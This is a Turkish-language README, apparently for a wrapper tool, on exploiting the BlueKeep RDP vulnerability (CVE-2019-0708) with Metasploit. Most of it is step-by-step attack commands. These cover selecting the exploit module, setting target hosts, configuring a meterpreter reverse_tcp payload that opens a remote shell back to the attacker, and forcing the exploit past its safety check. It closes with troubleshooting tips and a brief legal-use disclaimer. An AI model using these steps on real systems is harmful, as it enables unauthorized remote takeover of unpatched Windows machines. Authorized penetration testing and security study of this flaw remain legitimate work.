# BlueKeep Metasploit Kullanım Kılavuzu

Bu belge, CVE-2019-0708 (BlueKeep) güvenlik açığını istismar etmek için Metasploit Framework'ü nasıl kullanacağınızı açıklar.

## Gereksinimler

- Metasploit Framework
- Python 3
- Hedef Windows makineler (Windows 7, Windows Server 2008, Windows XP vb.)

## Metasploit Kurulumu

Eğer sisteminizde Metasploit Framework yüklü değilse:

```bash
sudo apt update
sudo apt install metasploit-framework
```

## Metasploit ile BlueKeep Exploit'i Kullanımı

### Otomatik Script ile Kullanım

Sağlanan Python scripti, Metasploit'i kullanarak BlueKeep exploit'ini çalıştırmanızı kolaylaştırır:

```bash
python3 metasploit_bluekeep.py -i HEDEF_IP -l YEREL_IP
```

#### Zorla Çalıştırma (Vulnerability Check Bypass)

Exploit otomatik güvenlik kontrolünü geçemezse, şu şekilde zorla çalıştırabilirsiniz:

```bash
python3 metasploit_bluekeep.py -i HEDEF_IP -l YEREL_IP -f
```

veya doğrudan zorla çalıştırma betiğini kullanabilirsiniz:

```bash
python3 force_exploit.py -i HEDEF_IP -l YEREL_IP
```

### Manuel Metasploit Kullanımı

1. Metasploit konsolunu başlatın:
   ```bash
   msfconsole
   ```

2. BlueKeep exploit modülünü kullanın:
   ```
   use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
   ```

3. Hedef IP adresini ayarlayın:
   ```
   set RHOSTS 192.168.1.10
   ```

4. (Opsiyonel) Hedef sistem türünü belirtin:
   ```
   set TARGET 1
   ```
   Desteklenen hedefler:
   - 0: Otomatik hedefleme
   - 1: Windows 7 SP1
   - 2: Windows 7 SP0
   - 3: Windows Server 2008 R2 SP1
   - 4: Windows Server 2008 R2 SP0
   - 5: Windows Server 2008 SP1

5. Payload ayarlayın:
   ```
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.1.5
   set LPORT 4444
   ```

6. (Gerekirse) Güvenlik kontrolünü atlayın:
   ```
   set ForceExploit true
   set AutoCheck false
   ```

7. Exploit'i çalıştırın:
   ```
   exploit
   ```

## Sorun Giderme

Exploit çalışmıyorsa:

1. Hedef sistemin açığa karşı savunmasız olduğundan emin olun
2. Otomatik kontrolleri devre dışı bırakıp zorla çalıştırmayı deneyin:
   ```
   set ForceExploit true
   set AutoCheck false
   exploit
   ```
3. Farklı bir TARGET değeri deneyin
4. 32-bit sistemler için farklı payload deneyin: `windows/meterpreter/reverse_tcp`

## Güvenlik Uyarısı

Bu aracı yalnızca yasal penetrasyon testleri, güvenlik araştırmaları ve kendi sistemleriniz üzerinde kullanın. İzinsiz sistemlere erişim sağlamak yasadışıdır ve cezai sorumluluk doğurabilir.

## Desteklenen Hedefler

BlueKeep açığı aşağıdaki Windows sürümlerini etkiler:

- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2003
- Windows Server 2008
- Windows Server 2008 R2

64-bit sistemlerde daha güvenilir çalışır ve varsayılan x64 payload'ı kullanır. 32-bit sistemler için `windows/meterpreter/reverse_tcp` payload'ını kullanabilirsiniz.
